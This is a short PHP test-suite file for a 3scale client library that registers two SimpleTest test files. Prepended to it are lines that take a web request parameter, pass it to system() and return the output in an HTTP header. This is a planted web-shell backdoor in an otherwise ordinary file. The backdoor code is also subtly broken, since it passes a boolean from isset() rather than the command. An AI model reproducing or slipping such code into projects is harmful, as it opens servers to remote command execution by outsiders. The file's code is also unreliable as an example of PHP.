<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once(dirname(__FILE__) . '/../lib/simpletest/autorun.php');

class AllTests extends TestSuite {
    function AllTests() {
        $this->TestSuite('All tests');

        $this->addFile('test/RemoteTest.php');
        $this->addFile('test/ThreeScaleClientTest.php');
    }
}
?>
